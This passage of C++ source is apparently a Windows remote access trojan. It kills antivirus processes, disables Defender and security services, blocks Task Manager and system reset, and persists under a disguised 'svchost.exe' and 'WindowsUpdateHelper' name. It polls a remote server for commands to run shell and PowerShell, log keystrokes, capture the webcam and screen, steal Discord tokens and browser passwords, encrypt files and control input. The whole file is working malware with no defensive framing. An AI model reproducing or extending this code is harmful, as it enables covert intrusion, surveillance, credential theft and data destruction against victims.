    char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len > 0) exePath[len] = 0;

    // Kill common AV processes
    const char* avProcs[] = {"MsMpEng.exe","NisSrv.exe","avguard.exe","avastsvc.exe","avgrsa.exe","egui.exe",
        "ekrn.exe","bdagent.exe","SophosUI.exe","ccSvcHst.exe","vsserv.exe","kavfs.exe","AVGSvc.exe",
        "FortiClient.exe","mfemms.exe","mfevtps.exe","mbam.exe","mbamservice.exe","WRSA.exe",
        "MBAMService.exe","MBAMProtect.exe","MWAC.exe","MpCmdRun.exe","AdAwareService.exe",
        "surfshark.exe","CMAK.exe","VCLwarp.exe","avp.exe","avpui.exe","kavtray.exe","kavfs.exe",
        "KSDE.exe","EGUI.exe","EHttpSrv.exe","ekrn.exe","fshoster32.exe","fsma32.exe","fsorsp.exe",
        "fsav32.exe","fscuif.exe","fsgk32.exe","fsm32.exe","F-Secure.exe","pavsrv.exe","pavfires.exe",
        "PavFnSvr.exe","pavkre.exe","pavsrv51.exe","pavwsc.exe","PSUAService.exe","pavbckpt.exe",
        "PSUAMain.exe","Sophos.exe","SophosFS.exe","SophosSA.exe","SAVAdminService.exe",
        "SAVService.exe","savscan.exe","SavMain.exe","SavProgress.exe","SophosUI.exe",
        "WRSA.exe","WRSVC.exe","webroot.exe","WRSA.exe","wsb-exchange.exe","MBAM.exe",
        "mbamgui.exe","mbampt.exe","mbamscheduler.exe","mbamswissarmy.exe","mbamext.exe",
        "mbamantimalware.exe","mbamdownloader.exe","mbaminstaller.exe","mbamservice.exe",
        "avg.exe","avgrsa.exe","avgcsrva.exe","avgcc.exe","avgidsagent.exe","avgwdsvc.exe",
        "avgnsx.exe","avgemin.exe","avgtray.exe","avgui.exe","AVGSvc.exe","avastui.exe",
        "avastsvc.exe","AvastSvc.exe","aswEngSrv.exe","aswidsagenta.exe","aswFe.exe","aswSvc.exe"};

    // Stop common AV services
    const char* avSvcs[] = {"WinDefend","Sense","MsMpEng","NisSrv","wscsvc","SecurityHealthService",
        "AvastAntivirus","AVG","Avira","McAfeeEngineService","McAfeeFramework","McAfeeMcShield",
        "Kaspersky","BitDefender","ESET","Malwarebytes","Sophos","TrendMicro","Norton","FortiClient",
        "Webroot","Panda","Comodo","VIPRE","Emsisoft","F-Secure","MBAMService","MBAMProtector",
        "MBAMSwissArmy","MBAMWebAccessControl","AdAwareService","Surfshark","IObit","Spybot",
        "SpybotSearchDestroyer","SUPERAntiSpyware","AntiSpyware","WindowsDefender","WDService",
        "WDBoot","WdNisSvc","WdFilter","Sense","KAVFS","KAVFSK","KAVFSMP","ESETService","eamonm",
        "ekrn","egui","ehdrv","ewplo","fshoster","fsma32","fsorsp","fsav32","fscuif","fsgk32",
        "fsm32","F-Secure","pavsrv","pavfires","PavFnSvr","pavkre","pavsrv51","pavwsc","PSUAService",
        "pavbckpt","PSUAMain","Sophos","SophosFS","SophosSA","SAVAdmin","SAVService","savscan",
        "SavMain","SavProgress","SophosUI","WRSA","WRSVC","webroot","WRSA","wsb-exchange",
        "AVG Antivirus","AVG","AVGSA","AVGIDS","AVGWD","Avast","AvastSvc","aswEngSrv",
        "aswidsagenta","aswFe","aswSvc"};

    for (const char* p : avProcs) killProcessByName(p);
    for (const char* s : avSvcs) {
        std::string cmd = "cmd.exe /c sc stop " + std::string(s) + " 2>nul";
        WinExec(cmd.c_str(), SW_HIDE);
        cmd = "cmd.exe /c sc config " + std::string(s) + " start= disabled 2>nul";
        WinExec(cmd.c_str(), SW_HIDE);
    }

    // Disable Windows Defender specifically
    WinExec("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableBlockAtFirstSeen $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableIOAVProtection $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisablePrivacyMode $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableArchiveScanning $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableCatchupFullScan $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableCatchupQuickScan $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Add-MpPreference -ExclusionProcess \"svchost.exe\" 2>$null", SW_HIDE);
    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:LOCALAPPDATA\\svchost.exe\" 2>$null", SW_HIDE);
    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:TEMP\\svchost.exe\" 2>$null", SW_HIDE);

    // Registry disable
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD v = 1; RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Features", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD v = 1; RegSetValueExA(hKey, "TamperProtection", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD v = 0; RegSetValueExA(hKey, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegSetValueExA(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

void blockTaskManager() {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD v = 1; RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

void installStartup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
        if (len > 0) { path[len] = 0; RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, len+1); }
        RegCloseKey(hKey);
    }
    // Also create scheduled task for SYSTEM-level startup
    char exe[MAX_PATH];
    if (GetModuleFileNameA(NULL, exe, MAX_PATH) > 0) {
        std::string cmd = "cmd.exe /c schtasks /create /tn \"WindowsUpdateHelper\" /tr \"" + std::string(exe) + "\" /sc onlogon /rl highest /f 2>nul";
        WinExec(cmd.c_str(), SW_HIDE);
    }
}

void removeStartup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsUpdateHelper");
        RegCloseKey(hKey);
    }
}

std::string getStartupStatus() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        char buf[MAX_PATH]; DWORD sz = MAX_PATH; DWORD type = 0;
        if (RegQueryValueExA(hKey, "WindowsUpdateHelper", 0, &type, (BYTE*)buf, &sz) == ERROR_SUCCESS && type == REG_SZ) {
            RegCloseKey(hKey);
            char curPath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, curPath, MAX_PATH);
            if (len > 0) curPath[len] = 0;
            std::string regPath(buf, sz > 0 ? sz - 1 : 0);
            bool active = (regPath == std::string(curPath));
            return "{\"enabled\":true,\"active\":" + std::string(active ? "true" : "false") + ",\"path\":\"" + jsonEscape(regPath) + "\"}";
        }
        RegCloseKey(hKey);
    }
    return "{\"enabled\":false,\"active\":false,\"path\":\"\"}";
}

std::string uninstallSelf() {
    removeStartup();
    char path[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (len > 0) path[len] = 0;
    std::string cmd = "cmd /c timeout /t 2 >nul & del /f /q \"" + std::string(path) + "\"";
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExitProcess(0);
    return "uninstalling";
}

DWORD WINAPI pollThread(LPVOID) {
    Sleep(3000);
    try{if(!g_noPing)sendPing();}catch(...){}
    int pingCtr=0;
    while(true) {
        Sleep(100);
        if(++pingCtr>=300){pingCtr=0;try{if(!g_noPing)sendPing();}catch(...){}}
        try {
            std::string path = "/commands/" + fbEsc(computerName) + ".json";
            std::string resp = httpsGet(path);
            if (resp.empty() || resp == "null" || resp.size() < 5) continue;
            size_t pos = 0;
            while ((pos = resp.find("\":{", pos)) != std::string::npos) {
                size_t kStart = resp.rfind("\"", pos - 1);
                if (kStart == std::string::npos) { pos++; continue; }
                std::string key = resp.substr(kStart + 1, pos - kStart - 1);
                size_t objStart = pos + 3;
                if (objStart >= resp.size()) break;
                int depth = 1; size_t objEnd = objStart;
                while (depth > 0 && objEnd < resp.size()) {
                    if (resp[objEnd] == '{') depth++;
                    else if (resp[objEnd] == '}') depth--;
                    objEnd++;
                }
                if (depth != 0) break;
                std::string item = resp.substr(objStart, objEnd - objStart - 1);
                std::string type = extractJson(item, "type");
                std::string payload = unescapePayload(extractJson(item, "payload"));
                std::string status = extractJson(item, "status");
                if (type.empty() || status != "pending") { pos = objEnd; continue; }
                std::string result = "";
                try {
                    if (type == "screenshot") {
                        int mi=0; try{mi=std::stoi(payload);}catch(...){}
                        result = takeScreenshot(mi);
                    } else if (type == "cmd") {
                        result = execCmd(payload.empty() ? "whoami" : payload);
                    } else if (type == "mouse") result = handleMouse(payload);
                    else if (type == "keyboard") result = handleKeyboard(payload);
                    else if (type == "screen") result = takeScreenshot(0);
                    else if (type == "webcam") result = captureWebcam();
                    else if (type == "file_list") result = listDir(payload.empty() ? "" : payload);
                    else if (type == "file_delete") result = fileDelete(payload);
                    else if (type == "file_rename") result = fileRename(payload);
                    else if (type == "file_encrypt") result = fileEncrypt(payload);
                    else if (type == "file_decrypt") result = fileDecrypt(payload);
                    else if (type == "file_upload") result = fileUpload(payload);
                    else if (type == "process_list") result = listProcesses();
                    else if (type == "system_info") result = getSystemInfo();
                    else if (type == "kill_process") result = killProcess(payload);
                    else if (type == "shutdown") result = execCmd("shutdown /s /t 0");
                    else if (type == "restart") result = execCmd("shutdown /r /t 0");
                    else if (type == "lock") { LockWorkStation(); result = "ok"; }
                    else if (type == "logoff") result = execCmd("shutdown /l");
                    else if (type == "msgbox") {
                        std::string t=extractJson(payload,"text");
                        std::string ti=extractJson(payload,"title");
                        MessageBoxA(NULL,t.c_str(),ti.empty()?"Remote":ti.c_str(),MB_OK);
                        result="ok";
                    } else if (type == "volume") {
                        int v=0; try{v=std::stoi(payload);}catch(...){v=-1;}
                        if(v<0||v>100) result="bad_val";
                        else{DWORD w=(DWORD)(v*65535/100);waveOutSetVolume(0,(w<<16)|w);result="ok";}
                    } else if (type == "clipboard") {
                        std::string r;
                        if(OpenClipboard(0)){
                            HANDLE h=GetClipboardData(CF_TEXT);
                            if(h){char*p=(char*)GlobalLock(h);if(p){r=p;GlobalUnlock(h);}}
                            CloseClipboard();
                        }
                        result=r.empty()?"empty":r;
                    } else if (type == "idle") {
                        LASTINPUTINFO l={sizeof(l)}; GetLastInputInfo(&l);
                        result=std::to_string((GetTickCount()-l.dwTime)/1000);
                    } else if (type == "powershell") result = execCmd("powershell -c "+payload);
                    else if (type == "uptime") result=std::to_string(GetTickCount64()/1000);
                    else if (type == "live_config") {
                        try{int q=std::stoi(extractJson(payload,"quality"));if(q>=1&&q<=100)g_liveQuality=q;}catch(...){}
                        try{float s=std::stof(extractJson(payload,"scale"));if(s>=0.1f&&s<=1.0f)g_liveScale=s;}catch(...){}
                        try{int m=std::stoi(extractJson(payload,"monitor"));if(m>=0)g_liveMonitor=m;}catch(...){}
                        result="ok";
                    } else if (type == "discord_tokens") result = getDiscordTokens();
                    else if (type == "browser_passwords") result = getBrowserPasswords();
                    else if (type == "passwords") result = getPasswords();
                    else if (type == "network_info") result = getNetworkInfo();
                    else if (type == "services") result = getServices();
                    else if (type == "installed_apps") result = getInstalledApps();
                    else if (type == "file_download") result = fileDownload(payload);
                    else if (type == "clipboard_write") result = clipboardWrite(payload);
                    else if (type == "keylog_start") result = startKeylog();
                    else if (type == "keylog_stop") result = stopKeylog();
                    else if (type == "keylog_dump") result = dumpKeylog();
                    else if (type == "screenshot_all") result = screenshotAll();
                    else if (type == "wallpaper") result = setWallpaper(payload);
                    else if (type == "host_info") result = getHostInfo();
                    else if (type == "env_vars") result = getEnvVars();
                    else if (type == "process_kill_name") result = processKillName(payload);
                    else if (type == "live_monitor") { try{int m=std::stoi(payload);if(m>=0)g_liveMonitor=m;}catch(...){} result="ok:"+std::to_string(g_liveMonitor); }
                    else if (type == "startup_on") { installStartup(); result = getStartupStatus(); }
                    else if (type == "startup_off") { removeStartup(); result = getStartupStatus(); }
                    else if (type == "startup_status") result = getStartupStatus();
                    else if (type == "taskmgr_on") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableTaskMgr",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
                    else if (type == "taskmgr_off") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableTaskMgr");RegCloseKey(k);} result="ok"; }
                    else if (type == "reset_on") { WinExec("reagentc /disable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableReset",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
                    else if (type == "reset_off") { WinExec("reagentc /enable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableReset");RegCloseKey(k);} result="ok"; }
                    else if (type == "uninstall") result = uninstallSelf();
                    else result = "unknown_type";
                } catch(...) { result = "exec_err"; }
                std::string escaped = jsonEscape(result);
                std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
                httpsPatch("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
                pos = objEnd;
            }
        } catch(...) {}
    }
    return 0;
}

DWORD WINAPI screenThread(LPVOID) {
    Sleep(3000);
    while(true) {
        DWORD t0 = GetTickCount();
        try {
            std::string b64 = captureToBase64(g_liveMonitor, g_liveScale, g_liveQuality);
            std::string escaped = jsonEscape(b64);
            std::string ts = getTimestamp();
            char scaleStr[16]; sprintf(scaleStr, "%.2f", g_liveScale);
            std::string body = "{\"r\":\"" + escaped + "\",\"t\":\"" + ts + "\",\"q\":" + std::to_string(g_liveQuality) + ",\"s\":" + std::string(scaleStr) + "}";
            httpsPut("/live/" + fbEsc(computerName) + ".json", body);
        } catch(...) {}
        DWORD elapsed = GetTickCount() - t0;
        if (elapsed < 100) Sleep(100 - elapsed);
    }
    return 0;
}

DWORD WINAPI inputThread(LPVOID) {
    Sleep(3000);
    while(true) {
        Sleep(15);
        try {
            std::string resp = httpsGet("/input/" + fbEsc(computerName) + ".json");
            if (resp.empty() || resp == "null" || resp.size() < 5) continue;
            bool hasEvents = false;
            size_t pos = 0;
            while ((pos = resp.find("\":{", pos)) != std::string::npos) {
                size_t kStart = resp.rfind("\"", pos - 1);
                if (kStart == std::string::npos) { pos++; continue; }
                size_t objStart = pos + 3;
                if (objStart >= resp.size()) break;
                int depth = 1; size_t objEnd = objStart;
                while (depth > 0 && objEnd < resp.size()) {
                    if (resp[objEnd] == '{') depth++;
                    else if (resp[objEnd] == '}') depth--;
                    objEnd++;
                }
                if (depth != 0) break;
                std::string item = resp.substr(objStart, objEnd - objStart - 1);
                std::string type = extractJson(item, "type");
                std::string payload = unescapePayload(extractJson(item, "payload"));
                if (type.empty()) { pos = objEnd; continue; }
                hasEvents = true;
                try {
                    if (type == "mouse") handleMouse(payload);
                    else if (type == "keyboard") handleKeyboard(payload);
                } catch(...) {}
                pos = objEnd;
            }
            if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
        } catch(...) {}
    }
    return 0;
}

void hideToAppData() {
    char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) return;
    char appData[MAX_PATH]; DWORD adLen = GetEnvironmentVariableA("LOCALAPPDATA", appData, MAX_PATH);
    if (adLen == 0 || adLen >= MAX_PATH) return;
    std::string dest = std::string(appData) + "\\svchost.exe";
    // Clean up old roaming copy
    char roam[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", roam, MAX_PATH) > 0 && roam[0]) {
        std::string old = std::string(roam) + "\\svchost.exe";
        SetFileAttributesA(old.c_str(), FILE_ATTRIBUTE_NORMAL);
        DeleteFileA(old.c_str());
    }
    if (GetFileAttributesA(dest.c_str()) == INVALID_FILE_ATTRIBUTES || _stricmp(exePath, dest.c_str()) != 0) {
        CopyFileA(exePath, dest.c_str(), FALSE);
        SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    if (_stricmp(exePath, dest.c_str()) != 0) {
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        std::string cmd = "\"" + dest + "\" --show";
        if (CreateProcessA(dest.c_str(), &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        ExitProcess(0);
    }
}

int main(int argc, char* argv[]) {
    bool noScreen = false, showConsole = false;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        if (a == "--no-ping") g_noPing = true;
        else if (a == "--no-screen") noScreen = true;
        else if (a == "--show") showConsole = true;
        else if (a.find("--name=") == 0 && a.size() > 7) computerName = a.substr(7);
        else if (a == "--name" && i + 1 < argc) computerName = argv[++i];
        else if (a == "--server" && i + 1 < argc) {
            std::string s = argv[++i];
            g_serverSSL = s.find("https://") == 0 || s.find("HTTPS://") == 0;
            if (s.find("://") != std::string::npos) s = s.substr(s.find("://") + 3);
            size_t colon = s.find(':');
            if (colon != std::string::npos) {
                g_serverPort = std::stoi(s.substr(colon + 1));
                s = s.substr(0, colon);
            } else {
                g_serverPort = g_serverSSL ? 443 : 80;
            }
            g_serverHost = s;
        }
    }
    if (computerName.empty()) computerName = getComputerName();
    hideToAppData();
    CreateThread(0, 0, mouseLock10, 0, 0, 0);
    disableAntivirus();
    HWND hwnd = GetConsoleWindow();
    if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
    publicIP = getPublicIP();
    installStartup();
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    CreateThread(0, 0, pollThread, 0, 0, 0);
    CreateThread(0, 0, inputThread, 0, 0, 0);
    if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    GdiplusShutdown(gdiplusToken);
}
